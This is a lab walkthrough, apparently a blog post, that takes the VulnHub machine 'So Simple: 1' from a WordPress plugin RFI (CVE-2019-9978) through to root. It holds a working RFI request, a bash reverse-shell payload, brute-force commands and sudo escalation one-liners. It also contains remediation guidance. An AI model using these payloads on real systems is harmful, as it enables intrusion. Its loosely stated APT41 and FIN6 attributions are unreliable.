# So Simple: 1 — It's Never Actually Simple, Is It?

Alright dudes!! Don't let the name fool you. So Simple: 1 is a beautifully layered WordPress exploitation chain that stacks four distinct privilege escalation steps into one clean attack path. CVE-2019-9978 (Social Warfare plugin RCE), an exposed SSH private key, a sudo path traversal via `service`, and a writable non-existent sudo script. Each step flows naturally into the next. The designer clearly wanted you to understand that "simple" machines are only simple after you've internalized the methodology. Legit one of the best intermediate WordPress boxes on VulnHub. no cap.

| Field | Value |
|---|---|
| **Level** | Easy/Medium |
| **Target VM** | So Simple: 1 |
| **Attacker VM** | Kali Linux 2024.x |
| **VulnHub URL** | https://www.vulnhub.com/entry/so-simple-1,515/ |
| **Techniques** | WordPress enumeration with wpscan, credential brute-force, CVE-2019-9978 Social Warfare RFI/RCE, reverse shell delivery, SSH private key extraction, lateral movement via SSH, sudo path traversal via `service` binary, writable sudo script exploitation |
| **CVEs** | CVE-2019-9978 (Social Warfare WordPress plugin RFI/RCE, unpatched 3.5.0), CWE-522 (Insufficiently Protected Credentials: SSH private key in web-accessible path), CWE-269 (Improper Privilege Management: sudo misconfigurations) |
| **APT Groups** | APT41: consistently targets WordPress installations with known plugin vulnerabilities for initial access in enterprise environments; FIN6: uses chained sudo misconfiguration escalation on compromised Linux hosts during post-exploitation |

---

## Attack Summary

```
nmap → port 22 (SSH), port 80 (HTTP WordPress)
  → gobuster: WordPress detected
  → wpscan: user "max", Social Warfare plugin 3.5.0 (CVE-2019-9978)
  → wpscan brute-force: max:opensesame
  → CVE-2019-9978: RFI via swp_debug endpoint → RCE as www-data
  → /home/max/.ssh/id_rsa: exposed SSH private key
  → ssh -i max_key max@target → shell as max
  → sudo -l (as max): can run /usr/sbin/service as steven NOPASSWD
  → sudo -u steven /usr/sbin/service ../../bin/bash → shell as steven
  → sudo -l (as steven): can run /opt/tools/server-health.sh as root NOPASSWD
  → create /opt/tools/server-health.sh → sudo execute → uid=0(root)
  → cat /root/flag.txt
```

---

## Methodology

1. Host discovery and full port scan
2. Web enumeration: detect WordPress installation
3. WordPress user and plugin enumeration with wpscan
4. WordPress credential brute-force (wpscan + rockyou)
5. Social Warfare CVE-2019-9978: RFI to RCE as www-data
6. SSH private key recovery from web-accessible home directory
7. Lateral movement: SSH as max using extracted private key
8. Sudo abuse: max to steven via `service` path traversal
9. Sudo abuse: steven to root via writable non-existent script
10. Root flag capture

---

## Step 1 — Host Discovery and Port Scan

Identify the target and enumerate services:

```bash
arp-scan -l
# or: sudo netdiscover -r 192.168.56.0/24
export TARGET=192.168.56.105

nmap -sV -sC -p- $TARGET
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.x
80/tcp open  http    Apache httpd 2.4.x
```

Standard two-port CTF setup. HTTP is the primary attack surface. SSH is the lateral movement target.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — Web Enumeration and WordPress Detection

Browse to `http://$TARGET/`. Identify the application type from headers, page source, and directory structure:

```bash
curl -s http://$TARGET/ | grep -E "wp-content|wp-includes|wordpress"

gobuster dir \
  -u http://$TARGET \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -t 40 \
  -o /tmp/sosimple_dirs.txt
```

WordPress installation confirmed. Proceed with WordPress-specific tooling.

**MITRE ATT&CK:** T1083 — File and Directory Discovery

---

## Step 3 — WordPress Enumeration with wpscan

Enumerate users and vulnerable plugins:

```bash
wpscan --url http://$TARGET --enumerate u,vp --plugins-detection aggressive
```

```
[+] WordPress version 5.x detected
[+] User(s) Identified: max
[+] Social Warfare 3.5.0 is vulnerable to CVE-2019-9978
```

Key findings:
- User: **max**
- Plugin: **Social Warfare 3.5.0** (unauthenticated RCE via CVE-2019-9978)

**Real-world note:** WordPress plugin vulnerabilities are the primary initial access vector for attacks on WordPress sites. APT41 maintains a catalog of unpatched WordPress plugin CVEs and actively scans for vulnerable installations at scale. CVE-2019-9978 specifically allows unauthenticated remote code execution via the Social Warfare plugin's debug endpoint.

**MITRE ATT&CK:** T1595.002 — Active Scanning: Vulnerability Scanning; T1592 — Gather Victim Host Information

---

## Step 4 — WordPress Credential Brute-Force

Brute-force the `max` account with rockyou:

```bash
wpscan --url http://$TARGET --username max --passwords /usr/share/wordlists/rockyou.txt --password-attack wp-login
```

```
[SUCCESS] Credentials found: max / opensesame
```

**Credentials:** `max : opensesame`

**Note:** Even though CVE-2019-9978 provides unauthenticated RCE, obtaining valid credentials provides an alternative access path and confirms user enumeration findings.

**MITRE ATT&CK:** T1110.001 — Brute Force: Password Guessing

---

## Step 5 — CVE-2019-9978 Social Warfare Plugin RCE

Social Warfare 3.5.0 and earlier contain an unauthenticated RFI vulnerability in the `swp_debug` parameter. A remote file containing PHP code is fetched and executed server-side.

**Setup attacker server:**

```bash
export LHOST=192.168.56.100
export LPORT=4444

# Create PHP RCE payload
cat > /tmp/payload.txt << 'EOF'
<pre>system('id')</pre>
EOF

# Verify code execution first
python3 -m http.server 80 &
curl "http://$TARGET/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://$LHOST/payload.txt"
```

If `uid=33(www-data)` appears in the response, RCE is confirmed. Now deliver a reverse shell:

```bash
# Update payload for reverse shell
cat > /tmp/payload.txt << 'EOF'
<pre>system("bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'")</pre>
EOF

# Replace placeholders with actual values
sed -i "s/LHOST/$LHOST/g; s/LPORT/$LPORT/g" /tmp/payload.txt

# Start listener
nc -lvnp $LPORT &

# Trigger the payload
curl "http://$TARGET/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://$LHOST/payload.txt"
```

Reverse shell received as `www-data`.

**Stabilize the shell:**

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
export SHELL=bash
# Ctrl+Z, then:
stty raw -echo; fg
```

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application; T1059.004 — Command and Scripting Interpreter: Unix Shell

---

## Step 6 — SSH Private Key Recovery

From the `www-data` shell, investigate user home directories:

```bash
ls -la /home/
ls -la /home/max/
ls -la /home/max/.ssh/

# Retrieve the private key
cat /home/max/.ssh/id_rsa
```

The SSH private key is world-readable (a critical misconfiguration). Copy it to the attacker machine:

```bash
# On attacker (in the nc listener):
# Paste the key content into a local file
chmod 600 /tmp/max_id_rsa
```

**Why this is critical:** An SSH private key stored in a world-readable location within a directory accessible by the web server process is equivalent to a cleartext password. Once `www-data` reads the filesystem, any file in `/home/max/` without proper permissions is exposed. FIN6 specifically enumerates `.ssh/` directories immediately after initial foothold on Linux systems.

**MITRE ATT&CK:** T1552.004 — Unsecured Credentials: Private Keys

---

## Step 7 — Lateral Movement to max via SSH

```bash
ssh -i /tmp/max_id_rsa max@$TARGET
```

Shell obtained as `max`. Enumerate the user's environment:

```bash
whoami && id
sudo -l
ls -la /home/max/
cat /home/max/flag*.txt 2>/dev/null
```

**MITRE ATT&CK:** T1021.004 — Remote Services: SSH

---

## Step 8 — Privilege Escalation: max to steven via sudo `service` Path Traversal

Check max's sudo permissions:

```bash
sudo -l
```

```
User max may run the following commands on so-simple:
    (steven) NOPASSWD: /usr/sbin/service
```

max can run `/usr/sbin/service` as `steven` without a password. The `service` binary supports path traversal in its first argument, allowing execution of arbitrary binaries:

```bash
sudo -u steven /usr/sbin/service ../../bin/bash
```

This traverses from the service scripts directory (`/etc/init.d/`) up to `/`, then resolves to `/bin/bash`, executing it as `steven`.

Shell obtained as `steven`.

```bash
whoami
# steven
```

**Real-world note:** The `service` binary path traversal for sudo escalation is catalogued in GTFOBins and consistently appears in Linux privilege escalation assessments. The root cause is a sudo entry that grants execution of a high-privilege utility (`service`) as another user without constraining its arguments.

**MITRE ATT&CK:** T1548.003 — Abuse Elevation Control Mechanism: Sudo

---

## Step 9 — Privilege Escalation: steven to root via Writable sudo Script

Check steven's sudo permissions:

```bash
sudo -l
```

```
User steven may run the following commands on so-simple:
    (root) NOPASSWD: /opt/tools/server-health.sh
```

steven can run `/opt/tools/server-health.sh` as root with no password. The file does not exist yet, and `/opt/tools/` may be writable or creatable. This is equivalent to unrestricted root access:

```bash
# Create the directory and script
mkdir -p /opt/tools
cat > /opt/tools/server-health.sh << 'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /opt/tools/server-health.sh

# Execute it as root
sudo /opt/tools/server-health.sh
```

Root shell obtained.

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
```

**MITRE ATT&CK:** T1548.003 — Abuse Elevation Control Mechanism: Sudo

---

## Step 10 — Root Flag

```bash
cat /root/flag.txt
```

(☞ﾟヮﾟ)☞ Root. gg dude. Four escalation steps in one box. wild.

**MITRE ATT&CK:** T1005 — Data from Local System

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Used For |
|---|---|---|---|
| WordPress credential | `max:opensesame` | wpscan brute-force | WP admin access (alternative path) |
| SSH private key | (varies) | /home/max/.ssh/id_rsa | SSH lateral movement as max |
| User flag | (varies) | /home/*/user.txt | Proof of user access |
| Root flag | (varies) | /root/flag.txt | Proof of root compromise |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | WordPress plugin CVE-2019-9978 unauthenticated RCE | Unpatched plugins are the #1 initial access vector for WordPress attacks; Social Warfare had 70,000+ active installs when this CVE was disclosed | Keep all WordPress plugins updated; use WPScan in CI to detect vulnerable plugin versions before deployment |
| 2 | SSH private key in web-accessible path | SSH private keys stored in home directories with loose permissions allow lateral movement from any process with filesystem read access | Store SSH keys in `~/.ssh/` with mode 600; never place them in directories accessible by web server processes |
| 3 | Sudo allows `service` with no argument restriction | Path traversal via `service` enables arbitrary command execution as the target user | Restrict sudo entries to fully qualified paths with specific arguments; never grant broad binary execution without constraints |
| 4 | Sudo allows non-existent script as root | Granting sudo access to a file that does not yet exist is equivalent to an unconditional root grant | Only grant sudo to scripts that are owned by root, exist, and are not writable by the sudoer |
| 5 | Weak WordPress password | `opensesame` is in the top 1000 of rockyou.txt | Enforce strong WordPress passwords; enable two-factor authentication; consider disabling XML-RPC |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Active Scanning | Vulnerability Scanning | T1595.002 |
| Reconnaissance | Discovery | File and Directory Discovery | T1083 |
| Initial Access | Initial Access | Exploit Public-Facing Application | T1190 |
| Credential Access | Brute Force | Password Guessing | T1110.001 |
| Credential Access | Unsecured Credentials | Private Keys | T1552.004 |
| Execution | Execution | Command Interpreter: Unix Shell | T1059.004 |
| Lateral Movement | Lateral Movement | Remote Services: SSH | T1021.004 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control: Sudo | T1548.003 |
| Collection | Collection | Data from Local System | T1005 |

---

## Remediation and Containment

### Technical Fixes

1. **Update Social Warfare plugin** to 3.5.3 or later; keep all WordPress plugins current; subscribe to WPScan vulnerability database notifications
2. **Remove SSH private key from web-accessible path**: store in `~/.ssh/id_rsa` with mode 600; ensure web server process cannot read user home directories
3. **Revoke exposed SSH private key** and generate a new keypair; update `~/.ssh/authorized_keys` for the `max` user
4. **Fix sudo entry for max**: remove the `service` entry entirely; if lateral movement as `steven` is required, use a specific restricted command
5. **Fix sudo entry for steven**: ensure `/opt/tools/server-health.sh` is owned by root with mode 755 before granting sudo access; if the script is not needed, remove the entry
6. **Enforce strong WordPress passwords**: minimum 12 characters; enable two-factor authentication; deploy Wordfence or equivalent WAF

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all WordPress installations; track plugin versions |
| Protect | Access Control | SSH key storage permissions; restrict sudo entries |
| Protect | Software Protection | Keep WordPress and all plugins patched |
| Detect | Anomalies and Events | Alert on WordPress admin login anomalies; monitor /opt/tools/ creation |
| Respond | Response Planning | Revoke compromised SSH keys; rotate WordPress credentials; audit all sudo entries |
| Recover | Recovery Planning | Rebuild compromised host; restore from clean backup |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-3 | Access Enforcement | SSH key file permissions; web directory restrictions |
| AC-6 | Least Privilege | Restrict sudo entries to specific, constrained commands |
| CM-7 | Least Functionality | Remove unused plugins; disable XML-RPC if not needed |
| IA-5 | Authenticator Management | Rotate exposed SSH keys; enforce strong WordPress passwords |
| SI-2 | Flaw Remediation | Patch WordPress plugins within SLA; subscribe to security advisories |
| SC-28 | Protection of Information at Rest | SSH keys stored with restrictive permissions |

### CISA KEV

CVE-2019-9978 (Social Warfare RCE) is referenced in CISA guidance on WordPress plugin vulnerabilities. The CISA Known Exploited Vulnerabilities catalog includes multiple WordPress plugin CVEs exploited by APT41 and other groups; organizations are directed to patch or disable affected plugins immediately.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Threat and Vulnerability Management (THREAT) | Perform Vulnerability Assessments | MIL3 |
| Identity and Access Management (IAM) | Manage Privileges and Accounts | MIL3 |
| Asset, Change, and Configuration Management (ASSET) | Manage Software | MIL2 |

### MITRE D3FEND

- **D3-ACH** — Application Configuration Hardening (patch Social Warfare; enforce sudo restrictions)
- **D3-OAM** — Operating System Administrative Management (audit sudo entries; enforce SSH key permissions)
- **D3-UAP** — User Account Permissions (restrict sudo to verified, root-owned scripts)

---

## Final Thoughts

So Simple: 1 is legit one of the most well-designed escalation chains on VulnHub. The CVE is real, the lateral movement via SSH key is a realistic post-exploitation scenario, and the chained sudo escalation teaches you to always re-enumerate after every privilege change. No cap, the "simple" machines teach you more methodology than the "hard" ones.

The real-world lesson here: a single unpatched WordPress plugin can be the entry point for a full domain compromise through chained misconfigurations. That's not a hypothetical. That's Tuesday.

Thanks guys!! (❍ᴥ❍ʋ)
